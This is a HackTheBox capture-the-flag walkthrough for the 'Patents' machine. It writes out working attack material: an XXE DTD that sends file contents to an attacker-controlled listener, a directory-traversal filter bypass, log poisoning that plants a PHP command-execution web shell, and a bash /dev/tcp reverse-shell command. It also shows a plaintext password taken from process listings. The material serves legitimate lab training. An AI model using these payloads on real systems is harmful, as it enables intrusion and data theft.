---
title: HTB: Patents
url: https://0xdf.gitlab.io/2020/05/16/htb-patents.html
date: 2020-05-16T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-patents, hackthebox, nmap, upload, libreoffice, office, xxe, gobuster, docx, custom-folder, sans-holiday-hack, dtd, log-poisoning, directory-traversal, lfi, webshell, docker, pspy, password-reuse, git, reverse-engineering, bof, exploit, python, pwntools, ghidra, pwn, onegadget, rop, libc, libc-database, df, mount, cyberchef, php, payloadsallthethings
---

![Patents](https://0xdfimages.gitlab.io/img/patents-cover.png)

Patents was a really tough box, that probably should have been rated insane. I’ll find two listening services, a webserver and a custom service. I’ll exploit XXE in Libre Office that’s being used to convert docx files to PDFs to leak a configuration file, which uncovers another section of the site. In that section, there is a directory traversal vulnerability that allows me to use log poisoning to get execution and a shell in the web docker container. To get root in that container, I’ll find a password in the process list. As root, I get access to an application that’s communicating with the custom service on the host machine. I’ll also find a Git repo with the server binary, which I can reverse and find an exploit in, resulting in a shell as root on the host machine. In Beyond Root, I’ll look at chaining PHP filters to exfil larger data over XXE.

## Box Info

| Name | [Patents](https://hackthebox.com/machines/patents)  [Patents](https://hackthebox.com/machines/patents) [Play on HackTheBox](https://hackthebox.com/machines/patents) |
| --- | --- |
| Release Date | [18 Jan 2020](https://twitter.com/hackthebox_eu/status/1218152776074743808) |
| Retire Date | 16 May 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Patents |
| Radar Graph | Radar chart for Patents |
| First Blood User | 05:24:59[metantz metantz](https://app.hackthebox.com/users/20347) |
| First Blood Root | 1 day02:24:51[stefano118 stefano118](https://app.hackthebox.com/users/3603) |
| Creator | [gbyolo gbyolo](https://app.hackthebox.com/users/36994) |

## Recon

### nmap

`nmap` shows three services over TCP, SSH (22), HTTP (80), and unknown on 8888:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.173
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-11 06:49 EST
Nmap scan report for 10.10.10.173
Host is up (0.016s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8888/tcp open  sun-answerbook

Nmap done: 1 IP address (1 host up) scanned in 7.89 seconds

root@kali# nmap -p 22,80,8888 -sC -sV -oA scans/tcpscripts 10.10.10.173
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-11 06:52 EST
Nmap scan report for 10.10.10.173
Host is up (0.013s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 39:b6:84:a7:a7:f3:c2:4f:38:db:fc:2a:dd:26:4e:67 (RSA)
|   256 b1:cd:18:c7:1d:df:57:c1:d2:61:31:89:9e:11:f5:65 (ECDSA)
|_  256 73:37:88:6a:2e:b8:01:4e:65:f7:f8:5e:47:f6:10:c4 (ED25519)
80/tcp   open  http            Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: MEOW Inc. - Patents Management
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   Help, LPDString, LSCP: 
|_    LFM 400 BAD REQUEST
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.80%I=7%D=2/11%Time=5E42956E%P=x86_64-pc-linux-gnu%r(LS
SF:CP,17,"LFM\x20400\x20BAD\x20REQUEST\r\n\r\n")%r(Help,17,"LFM\x20400\x20
SF:BAD\x20REQUEST\r\n\r\n")%r(LPDString,17,"LFM\x20400\x20BAD\x20REQUEST\r
SF:\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.54 seconds

```

Based on the [Apache version](https://packages.ubuntu.com/search?keywords=apache2), this looks like Ubuntu bionic (18.04). The [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server) doesn’t exactly match what the repo shows, but the [release notes](https://www.openssh.com/releasenotes.html) suggest that `7.7/7.7p1` is an bug fix on `7.6`, which is bionic as well.

### Unknown - TCP 8888

The service on port 8888 isn’t one that `nmap` can identify. It provided some strings like “LPDString”, “LSCP”, “LFM 400 BAD REQUEST”, but none of those turned up much in Google. Interestingly, “LPDString” does show up in a bunch of CTF solutions, but not in a way that really identifies this service or ended up being useful to me. I moved on to exploiting the web service for now.

### Website - TCP 80

#### Site

The site is for MEOW Inc., a patents management company:

![image-20200211071243757](https://0xdfimages.gitlab.io/img/image-20200211071243757.png)

It appears I’m already logged in as Ajeje Brazorf. I can click to view his profile at `/profile.html`:

![image-20200211071505679](https://0xdfimages.gitlab.io/img/image-20200211071505679.png)

The Edit Profile button does direct to `/edit-profile.html`, but the save button doesn’t seem to work.

The “Upload patent” link presents a form to upload a docx file:

![image-20200211071719604](https://0xdfimages.gitlab.io/img/image-20200211071719604.png)

#### Document Upload

I created a `.docx` file with LibreOffice Writer, and uploaded it to the site. It returned a button to “Download”:

![image-20200211073815014](https://0xdfimages.gitlab.io/img/image-20200211073815014.png)

The resulting PDF was just the dummy text from my document:

![image-20200211073840980](https://0xdfimages.gitlab.io/img/image-20200211073840980.png)

The file has a long hex filename. Downloading the PDF and looking at the metadata gives an important clue:

```

root@kali# exiftool 09a8748995be40dd924dce02cfa0189adc77a07e061ce3445162927c07d29259.pdf 
ExifTool Version Number         : 11.80
File Name                       : 09a8748995be40dd924dce02cfa0189adc77a07e061ce3445162927c07d29259.pdf
Directory                       : .
File Size                       : 8.6 kB
File Modification Date/Time     : 2020:02:11 07:28:14-05:00
File Access Date/Time           : 2020:02:11 07:28:27-05:00
File Inode Change Date/Time     : 2020:02:11 07:28:27-05:00
File Permissions                : rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Creator                         : Writer
Producer                        : LibreOffice 6.0
Create Date                     : 2020:02:11 12:28:46Z

```

This document was created by LibreOffice 6.0.

#### Directory Brute Force

I started with my normal `gobuster`, and found a few new folders to check out:

```

root@kali# gobuster dir -u http://10.10.10.173 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o scans/gobuster-80-root-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.173
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/11 07:17:52 Starting gobuster
===============================================================
/profile (Status: 200)
/uploads (Status: 301)
/static (Status: 301)
/upload (Status: 200)
/upload.php (Status: 200)
/release (Status: 301)
/index (Status: 200)
/vendor (Status: 301)
/config.php (Status: 200)
/patents (Status: 301)
/output (Status: 301)
/convert.php (Status: 200)
/edit-profile (Status: 200)
/server-status (Status: 403)
===============================================================
2020/02/11 07:23:28 Finished
===============================================================

```

`config.php` could be interesting, but unsurprisingly just loads a blank page over the webserver where it runs. I ran `gobuster` over a lot of the folders, but didn’t find much interesting. Eventually, I came back and found another path with a larger wordlist (for some reason a ton of uninteresting pages were returning 403, so I turned that off in this run):

```

root@kali# gobuster dir -u http://10.10.10.173/release -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o scans/gobuster-80-release-raft_large -t 40 -s "200,204,301,302,307,401"                                                                                                    
===============================================================
Gobuster v3.0.1             
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.173/release
[+] Threads:        40
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Status codes:   200,204,301,302,307,401
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/17 21:39:42 Starting gobuster
===============================================================
/UpdateDetails (Status: 200)
===============================================================
2020/02/17 21:40:51 Finished
===============================================================

```

#### /release/UpdateDetails

From the `gobuster` results, `UpdateDetails` returns text:

```

v1.2 alpha:
- meow@conquertheworld: Added ability to include patents. Still experimental, it's hidden.
v1.1 release:
- gbyolo@htb: Removed "meow fixes", they weren't real fixes. 
v1.0 release:
- meow@conquertheworld: Fixed the following vulnerabilities:
	1. Directory traversal
	2. Local file inclusion (parameter)
v0.9 alpha:
- meow@conquertheworld.htb: Minor fixes, fixed 2 vulnerabilities. The Docx2Pdf App is ready.
v0.7 alpha:
- gbyolo@tb: fixed conversion parameters. Meow's changes for custom folder should now work.
v0.7 alpja:
- meow@conquertheworld.htb: enabled entity parsing in custom folder
- gbyolo@htb: added conversion of all files, to generate pdf compliant from docx
v0.6 alpha:
- gbyolo@htb: enabled docx conversion to pdf. Seems to work!

```

## Shell as www-data [web]

### File Read Via XXE

#### Background

There was one line in the `UpdateDetails` file that jumped out for two reasons:

```

enabled entity parsing in custom folder

```
1. Entity parsing hints strongly towards an XML external entity (XXE) injection attack.
2. The “custom” folder could refer to the `customXml` folder at the root of a `.docx` file’s structure once unzipped.

I’ve [blogged before](/2019/03/27/analyzing-document-macros-with-yara.html#office-open-xml-example) about how modern documents such as Microsoft Office docs are just zip files with a bunch of XML files inside in a specific structure. The book “Word 2010” has a section [“Understanding .docx”](https://books.google.com/books?id=DoORDIe5UNUC&lpg=PT130&ots=XkR1IbatW6&dq=docx%20%22customxml%22%20folder&pg=PT130#v=onepage&q&f=false) which talks about this, and how there are three default folders and a `[Content Types].xml` file at the root of the file structure:

![image-20200217161926334](https://0xdfimages.gitlab.io/img/image-20200217161926334.png)
*Note: I spent some time going through how to create the legitimate use case for custom XML in an actual copy of Word because I believe it’s valuable to understand the technologies I’m trying to abuse. That said, there’s no reason you couldn’t create (or [download](https://file-examples.com/index.php/sample-documents-download/sample-doc-download/)) a `.docx` file, unzip it, and add the folder and files manually.*

[This tutorial](https://blogs.sap.com/2017/04/24/openxml-in-word-processing-custom-xml-part-mapping-flat-data/) gives a good walkthrough of the legitimate reason to include custom XML in a Word document. I followed the steps in the post under “Maintaining custom XML manually”, using the Custom XML Part Editor to import an XML file and then creating references to the elements in the document. Then when I opened the document (using the OOXML Tools Chrome extension), I had the three default folders plus `customXML`:

![image-20200217195615148](https://0xdfimages.gitlab.io/img/image-20200217195615148.png)

In the `customXML` folder, there was `item1.xml`, `itemProps1.xml`, and a `_rels` folder. `item1.xml` had the XML from my upload:

![image-20200217195718156](https://0xdfimages.gitlab.io/img/image-20200217195718156.png)

If I change the values for the various tags and open the word doc, they were updated where I had inserted the objects.

#### XXE POC

I played with a few different XXE payloads here. I first tried to see if I could get files from the local host to dump their content into one of the fields, but I didn’t have much luck. I suspect someone better at XXE than I am might be able to pull this off.

Overall, this challenge reminded me of one from the 2017 Sans Holiday Hack Challenge (since this was before I was blogging and I submitted a PDF report, I’ll link to the [winning entry that year](https://www.holidayhackchallenge.com/2017/winners/ncsa/report.html#q6_approach)). [This blog post from Sans](https://www.sans.org/blog/exploiting-xxe-vulnerabilities-in-iis-net/) does a good job describing how XXE works, and why I need to go this two hop route to get this to work.

I’ll create a `evil.dtd` that will define the file I want to go after and the method of exfiling it:

```

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % inception "<!ENTITY exfil SYSTEM 'http://10.10.14.30/data?%data;'>">

```

I’m using a PHP filter to base64-encode the data to eliminate spaces and other characters that might break the url coming back to me.

Next, I’ll add the XXE attack to `item1.xml`, including a reference to download the `.dtd` file, and calls to the various pieces to trigger the connection back:

```

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE df [
<!ELEMENT df ANY >
<!ENTITY % sp SYSTEM "http://10.10.14.30/evil.dtd">
    %sp;
    %inception;
]>
<data>
    <NAME>0xdf</NAME>
    <LAST_NAME></LAST_NAME>
    <DATE>&exfil;</DATE>
</data>

```

With a Python web server running and the `.dtd` file in that directory, I’ll upload the document. The webpage doesn’t offer the button to get a PDF, but I get two hits on the web server, a 200 downloading the `.dtd` file, and then a 404 with the exfil data:

```
10.10.10.173 - - [18/Feb/2020 04:40:04] "GET /evil.dtd HTTP/1.0" 200 -
10.10.10.173 - - [18/Feb/2020 04:40:04] code 404, message File not found
10.10.10.173 - - [18/Feb/2020 04:40:04] "GET /data?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpnYnlvbG86eDoxMDAwOjEwMDA6Oi9ob21lL2dieW9sbzovYmluL2Jhc2gK HTTP/1.0" 404 -

```

On base64 decoding, it’s the `passwd` file:

```

root@kali# echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpnYnlvbG86eDoxMDAwOjEwMDA6Oi9ob21lL2dieW9sbzovYmluL2Jhc2gK" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
gbyolo:x:1000:1000::/home/gbyolo:/bin/bash

```

#### More File Reads

Now that I don’t have to change the `.docx`, I can find the POST request to upload the `.docx.` in Burp and kick it over to Repeater. Then I can update the `.dtd` file and send that request to get additional files.

First I tried to get `/var/www/html/convert.php`, but nothing comes back. I tried a few other things like looking for SSH keys, and then I decided to check the Apache configuration. Hoping that the box used the default config file name paid off, returning `/etc/apache2/sites-enabled/000-default.conf`:

```

<VirtualHost *:80>
  DocumentRoot /var/www/html/docx2pdf

  <Directory /var/www/html/docx2pdf/>
      Options -Indexes +FollowSymLinks +MultiViews
      AllowOverride All
      Order deny,allow
      Allow from all
  </Directory>

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

That explains why I couldn’t find `convert.php`. Well, part of the way. Next I tried to get `/var/www/html/docx2pdf/convert.php`, and it still doesn’t work. This is likely because the resulting url is longer than the maximum url length of 2048 characters. But remembering `config.php` from `gobuster` above, I try to grab it and succeed:

```

<?php
# needed by convert.php
$uploadir = 'letsgo/';

# needed by getPatent.php
# gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it's vulnerable
define('PATENTS_DIR', '/patents/');
?>

```

I tried to get the source of `getPatent.php` using XXE, but failed. I’ll play with chaining PHP filters to get these files in [Beyond Root](#beyond-root---xxe-failures), but I didn’t need them to move on at this point.

### RCE Via Log Poisoning

#### getPatent

The new page is in the same template:

![image-20200218064238440](https://0xdfimages.gitlab.io/img/image-20200218064238440.png)

It says if `?id` is passed, information on the patent will come back:

![image-20200218064327257](https://0xdfimages.gitlab.io/img/image-20200218064327257.png)

It looks like patents 1-5 exist. When 6 is given, it just returns empty where the patent text would be:

![image-20200218064408202](https://0xdfimages.gitlab.io/img/image-20200218064408202.png)

#### Directory Traversal / LFI

The release notes talked about this page being vulnerable to directory traversal and local file inclusion (LFI). I immediately tried `?id=../../../../../etc/passwd`, but it didn’t return anything. I tried to get access to the local files that should be in this same folder, like `index.html` and `convert.php`, but no luck there either. This had me stuck for a while.

Eventually I considered that in the config, it defined `PATENTS_DIR` as `/patents/`. I suspect that the files are being loaded out of there. If that’s the case, then the local files would be up a directory from there. I tried `../index.html`, but still nothing. Feeling more confident that that location should work, I started trying LFI filter bypasses. If the site is looking for `../` and removing it, one trick that sometimes gets around that is to send `....//`. When the `../` is removed, it leaves `../`. That worked, visiting `http://10.10.10.173/getPatent_alphav1.0.php?id=....//index.html` borked the page:

![image-20200218065220428](https://0xdfimages.gitlab.io/img/image-20200218065220428.png)

A better example is `http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//etc/passwd`:

![image-20200218065250019](https://0xdfimages.gitlab.io/img/image-20200218065250019.png)

#### Examine Logs

One technique I’ve [used in the past](/tags.html#log-poisoning) to get a shell from LFI is log poisoning. First, I need to locate the log files. I tried to get to `access.log` in the default location, `/var/log/apache2/`, but nothing returned. But when I tried `error.log`, it returned results:

![image-20200218070703155](https://0xdfimages.gitlab.io/img/image-20200218070703155.png)

Looking through the logs, I see it generates errors whenever I threw my XXE payload at the site:

```

[Tue Feb 18 11:58:33.849913 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct(): http://10.10.14.30/evil.dtd:2: parser error : Detected an entity reference loop in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.849993 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct(): <!ENTITY % inception "<!ENTITY exfil SYSTEM 'http://10.10.14.30/data?%data;'>"> in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.850009 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct():                                                                               ^ in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.850111 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct(): Entity: line 6: parser warning : PEReference: %inception; not found in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.850132 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct():     %inception; in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.850144 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct():                ^ in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.850174 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct(): Entity: line 11: parser error : Entity 'exfil' not defined in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.850204 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct():     <DATE>&exfil;</DATE> in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.850216 2020] [php7:warn] [pid 15] [client 10.10.14.30:39448] PHP Warning:  SimpleXMLElement::__construct():                  ^ in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload
[Tue Feb 18 11:58:33.850321 2020] [php7:error] [pid 15] [client 10.10.14.30:39448] PHP Fatal error:  Uncaught Exception: String could not be parsed as XML in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php:52\nStack trace:\n#0 /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php(52): SimpleXMLElement->__construct('Gears\\Pdf\\Docx\\{closure}('__call('xml', Array)\n#5 /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/Backend.php(88): Gears\\Pdf\\Docx\\Backend->readDocx()\n#6 /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf.php(97): Gears\\Pdf\\Docx\\Backend->__construct(Object(Gears\\Pdf\\TempFile), Array)\n#7 /var/www/html/docx2pdf/convert.php in /var/www/html/docx2pdf/vendor/gears/pdf/src/Pdf/Docx/SimpleXMLElement.php on line 52, referer: http://10.10.10.173/upload

```

The most interesting part at this point is that it includes the referer header.

#### Poison Logs

I uploaded my XXE payload via `curl` with a poisoned referer header, with some `0xdf0xdf` tags in there to help me located the results in the log:

```

root@kali# curl http://10.10.10.173/convert.php -F "userfile=@HelloWorld-xxe.docx" -F 'submit=Generate PDF' --referer 'http://0xdf.gitlab.io/0xdf0xdf<?php system($_GET["cmd"]); ?>0xdf0xdf'

```

Then, I visited `http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//var//log//apache2//error.log&cmd=id`:

![image-20200218071954814](https://0xdfimages.gitlab.io/img/image-20200218071954814.png)

That’s code execution.

### Shell

To get a shell I just need to give a command of a reverse shell. I’ll use `bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1'`, which encodes to:

```

root@kali# curl 'http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//var//log//apache2//error.log&cmd=bash+-c+%27bash+-i+>%26+/dev/tcp/10.10.14.30/443+0>%261%27'

```

On running, I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.173.
Ncat: Connection from 10.10.10.173:37878.
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
www-data@04d2de4a6331:/var/www/html/docx2pdf$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 

```

## Priv: www-data –> root [web]

### Enumeration

#### Docker

There were several clues that I was running in a docker container. For example, there was a `.dockerenv` file at the system root:

```

www-data@04d2de4a6331:/$ ls -la .dockerenv 
-rwxr-xr-x 1 root root 0 Feb 18 11:50 .dockerenv

```

Also the somewhat random hostname:

```

www-data@04d2de4a6331:/$ hostname
04d2de4a6331

```

Neither `ip` nor `ifconfig` are in this container, but I can see the local IP in the file `/proc/net/fib_trie` (two comments added by me):

```

root@04d2de4a6331:/home/gbyolo# cat /proc/net/fib_trie
Main:                      
  +-- 0.0.0.0/1 2 0 2   
     +-- 0.0.0.0/4 2 0 2    
        |-- 0.0.0.0        
           /0 universe UNICAST
        +-- 10.100.0.0/24 2 0 2                       
           +-- 10.100.0.0/30 2 0 2
              |-- 10.100.0.0
                 /32 link BROADCAST
                 /24 link UNICAST
              |-- 10.100.0.2
                 /32 host LOCAL
           |-- 10.100.0.255      # IP
              /32 link BROADCAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1         # localhost
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
...[snip]...

```

At this point also, I’m can see `user.txt` in `/home/gbyolo`, but I can’t access it. I need to be either gbyolo or root.

#### Checker

In `/opt`, there’s a file and a folder having to do with `checker`:

```

www-data@04d2de4a6331:/opt$ ls -l
total 8
drwx------ 1 root root 4096 Dec  3 13:07 checker_client
-rw-r--r-- 1 root root   29 Feb 19 01:54 checker_runned

```

I can’t access the folder with the client, but I can see the contents of `checker_runned`, which contain a timestamp that seems to always have been the last minute:

```

www-data@04d2de4a6331:/opt$ cat checker_runned 
Wed Feb 19 01:55:01 UTC 2020

```

Running pspy, I see where this is running, as root:

```

2020/02/19 01:49:01 CMD: UID=0    PID=7805   | /usr/sbin/CRON -f
2020/02/19 01:49:01 CMD: UID=0    PID=7804   | /usr/sbin/CRON -f
2020/02/19 01:49:01 CMD: UID=0    PID=7806   | /usr/sbin/CRON -f
2020/02/19 01:49:01 CMD: UID=0    PID=7807   | /usr/sbin/CRON -f
2020/02/19 01:49:01 CMD: UID=0    PID=7808   | env PASSWORD=!gby0l0r0ck$$! /opt/checker_client/run_file.sh
2020/02/19 01:49:01 CMD: UID=0    PID=7809   | /bin/bash /opt/checker_client/run_file.sh
2020/02/19 01:49:01 CMD: UID=0    PID=7810   | python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD /var/www/html/docx2pdf/convert.php    

```

